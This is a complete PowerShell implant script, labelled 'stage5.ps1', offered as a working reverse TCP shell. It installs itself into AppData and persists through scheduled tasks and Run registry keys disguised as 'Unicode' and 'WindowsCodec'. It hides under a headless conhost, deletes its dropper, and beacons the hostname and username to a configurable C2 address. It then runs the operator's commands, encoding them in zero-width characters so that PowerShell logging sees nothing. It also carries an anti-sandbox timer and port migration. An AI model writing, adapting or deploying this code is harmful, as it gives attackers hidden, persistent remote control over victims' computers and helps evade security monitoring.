# stage5.ps1 — reverse TCP shell with stego command execution
# IP/port are read from ip.txt / port.txt at runtime.
# Set those files or pass C2_IP / C2_PORT env vars before packing.

$__sp = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
Remove-Module PSReadLine -ErrorAction SilentlyContinue
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
$WarningPreference     = 'SilentlyContinue'

$pf        = "$env:appdata\unicode"
$targetPs1 = Join-Path $pf "unicodeEBwdz.ps1"
$iptxt     = Join-Path $pf "ip.txt"
$porttxt   = Join-Path $pf "port.txt"
$cmdPs1    = Join-Path $pf "unicodecmd.ps1"
$errLog    = Join-Path $pf "err.txt"

# ── INSTALL BRANCH — runs once on first execution ────────────────────────────
if (-not (Test-Path $targetPs1)) {
    New-Item -ItemType Directory -Force -Path $pf | Out-Null

    try { Copy-Item $__sp $targetPs1 -Force }
    catch { [IO.File]::AppendAllText($errLog, "COPY_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }

    # Write C2 config — override via env vars at build time
    $defaultIP   = if ($env:C2_IP)   { $env:C2_IP }   else { '192.168.0.100' }
    $defaultPort = if ($env:C2_PORT) { $env:C2_PORT } else { '4444' }
    if (-not (Test-Path $iptxt))   { Set-Content -Path $iptxt   -Value $defaultIP }
    if (-not (Test-Path $porttxt)) { Set-Content -Path $porttxt -Value $defaultPort }

    # Persist via scheduled task — conhost.exe wrapper hides PS process name
    $isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $taskUser = if ($isAdmin) { "SYSTEM" } else { $env:USERNAME }
    $conhostArg = "--headless powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    $action   = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument $conhostArg
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew `
                    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    if ($isAdmin) {
        # Boot trigger — fires at system startup, no login required
        $trigger = New-ScheduledTaskTrigger -AtStartup
        try { Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger `
                  -Settings $settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null }
        catch { [IO.File]::AppendAllText($errLog, "TASK_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
        # HKLM Run key — fires for every user login, survives task deletion
        try { Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
                  -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg" }
        catch { [IO.File]::AppendAllText($errLog, "HKLM_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
    } else {
        # Repetition trigger — fires every 311s as current user
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                       -RepetitionInterval (New-TimeSpan -Seconds 311) `
                       -RepetitionDuration (New-TimeSpan -Days 9999)
        try { Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger `
                  -Settings $settings -User $env:USERNAME -Force | Out-Null }
        catch { [IO.File]::AppendAllText($errLog, "TASK_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
        # HKCU Run key — second persistence layer
        try { Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
                  -Name "WindowsCodec" -Value "C:\Windows\System32\conhost.exe $conhostArg" }
        catch { [IO.File]::AppendAllText($errLog, "HKCU_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
    }

    # Launch copy hidden, then delete this dropper
    try { Start-Process powershell.exe `
              -ArgumentList "-NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`"" `
              -WindowStyle Hidden }
    catch { [IO.File]::AppendAllText($errLog, "SP_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }

    Start-Sleep -Milliseconds 500
    Remove-Item $__sp -Force -ErrorAction SilentlyContinue
    exit
}

# ── RUN BRANCH — all subsequent executions ────────────────────────────────────
if (-not (Get-ScheduledTask -TaskName "Unicode" -ErrorAction SilentlyContinue)) {
    $isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    $conhostArg = "--headless powershell.exe -NoP -W Hidden -ExecutionPolicy Bypass -File `"$targetPs1`""
    $action   = New-ScheduledTaskAction -Execute "C:\Windows\System32\conhost.exe" -Argument $conhostArg
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew `
                    -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    if ($isAdmin) {
        $trigger = New-ScheduledTaskTrigger -AtStartup
        try { Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger `
                  -Settings $settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null }
        catch { [IO.File]::AppendAllText($errLog, "TASK_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
    } else {
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) `
                       -RepetitionInterval (New-TimeSpan -Seconds 311) `
                       -RepetitionDuration (New-TimeSpan -Days 9999)
        try { Register-ScheduledTask -TaskName "Unicode" -Action $action -Trigger $trigger `
                  -Settings $settings -User $env:USERNAME -Force | Out-Null }
        catch { [IO.File]::AppendAllText($errLog, "TASK_ERROR: $($_.Exception.Message)`n", [Text.Encoding]::UTF8) }
    }
}

$targetIP    = if (Test-Path $iptxt)   { (Get-Content $iptxt   -Raw).Trim() } else { 'C2_IP_HERE' }
$landingPort = if (Test-Path $porttxt) { [int](Get-Content $porttxt -Raw).Trim() } else { 5555 }
$targetPort  = $landingPort
$migrating   = $false

# ── STEGO COMMAND ENCODER ─────────────────────────────────────────────────────
# Encodes each C2 command as U+200B/U+200D before writing to disk.
# Defeats PowerShell Script Block Logging — log entry is invisible chars only.
function Encode-Stego {
    param($plaintext)
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($plaintext))
    $zw  = ''
    foreach ($ch in $b64.ToCharArray()) {
        $bits = [Convert]::ToString([int][char]$ch, 2).PadLeft(16, '0')
        foreach ($b in $bits.ToCharArray()) {
            $zw += if ($b -eq '0') { [char]0x200B } else { [char]0x200D }
        }
    }
    # Returns a self-contained PS snippet that decodes+executes the stego string
    return '$s="' + $zw + '";$o="";for($i=0;$i -lt $s.Length;$i+=16){' +
           '$b="";for($j=0;$j -lt 16;$j++){$c=[int][char]$s[$i+$j];' +
           '$b+=if($c -eq 0x200B){"0"}else{"1"}};$o+=[char]([Convert]::ToInt32($b,2))}' +
           '$d=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($o));' +
           '&([scriptblock]::Create($d))'
}

# ── BEACON + COMMAND LOOP ─────────────────────────────────────────────────────
$lifetimeSeconds = 300   # anti-sandbox: exit cleanly if no command in 300s
$retrySeconds    = 30    # reconnect interval if C2 is down

while ($true) {
    if (-not $migrating) { $targetPort = $landingPort }   # always re-land unless mid-migrate
    $migrating = $false

    $client = $null
    try {
        $client    = New-Object System.Net.Sockets.TcpClient
        $client.Connect($targetIP, $targetPort)
    } catch {
        if ($client) { $client.Close() }
        Start-Sleep -Seconds $retrySeconds
        continue
    }

    if (-not $client.Connected) {
        $client.Close()
        Start-Sleep -Seconds $retrySeconds
        continue
    }

    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream); $writer.AutoFlush = $true
    $reader = New-Object System.IO.StreamReader($stream)

    $writer.WriteLine("[+] $env:COMPUTERNAME\$env:USERNAME | PID: $PID | Lifetime: $lifetimeSeconds")

    $timerActive = $true
    $startTime   = Get-Date

    try {
        while ($client.Connected) {
            if ($timerActive) {
                if (((Get-Date) - $startTime).TotalSeconds -ge $lifetimeSeconds) {
                    $writer.WriteLine("[!] Lifetime reached. Reconnecting...")
                    break
                }
            }

            if ($stream.DataAvailable) {
                $cmd = $reader.ReadLine()
                if ($cmd -and $cmd.Trim()) {
                    if ($timerActive) { $timerActive = $false; $writer.WriteLine("[*] Timer Disabled") }

                    $ct = $cmd.Trim().ToLower()
                    try {
                        if ($ct -eq 'exit') {
                            $writer.WriteLine("[*] Session closed.")
                            $client.Close()
                            break
                        } elseif ($ct -match '^migrate \d+$') {
                            $newPort = [int]($ct.Split()[1])
                            $writer.WriteLine("[*] Migrating to port $newPort")
                            $targetPort = $newPort
                            $migrating  = $true
                            $client.Close()
                            break
                        } elseif ($ct -match '^(cd|set-location)(\s|$)') {
                            Invoke-Expression $cmd 2>&1 | Out-Null
                            $writer.WriteLine((Get-Location).Path)
                        } else {
                            $script = Encode-Stego $cmd
                            [IO.File]::WriteAllText($cmdPs1, $script, [Text.Encoding]::UTF8)
                            $out = (powershell.exe -NoP -ExecutionPolicy Bypass -File $cmdPs1 2>&1 | Out-String).TrimEnd()
                            Remove-Item $cmdPs1 -Force -ErrorAction SilentlyContinue
                            $writer.WriteLine($out)
                        }
                    } catch {
                        $writer.WriteLine("Error: $($_.Exception.Message)")
                    }
                }
            }
            Start-Sleep -Milliseconds 50
        }
    } catch {}

    if ($client) { try { $client.Close() } catch {} }
    if (-not $migrating) { Start-Sleep -Seconds $retrySeconds }   # skip delay mid-migrate
}
